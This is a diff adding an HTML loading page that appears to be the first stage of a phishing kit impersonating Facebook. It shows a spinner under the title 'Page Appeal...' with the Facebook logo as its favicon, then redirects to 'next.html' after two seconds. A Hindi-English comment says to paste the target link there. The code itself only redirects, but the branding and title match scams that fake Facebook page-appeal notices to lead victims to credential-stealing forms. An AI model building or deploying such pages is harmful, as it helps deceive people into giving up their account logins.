@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+    <title>Page Appeal...</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .loading-container {
+            text-align: center;
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        var redirectUrl = 'next.html'; // link aha par paste karo //***
+        var delayInMilliseconds = 2000;
+
+        function redirectToAnotherWebsite() {
+            window.location.replace(redirectUrl);
+        }
+
+        setTimeout(redirectToAnotherWebsite, delayInMilliseconds);
+    </script>
+</head>
+<body>
+    <div class="loading-container">
+        <p>Loading...</p>
+        <div class="loading-spinner"></div>
+    </div>
+</body>
+</html>
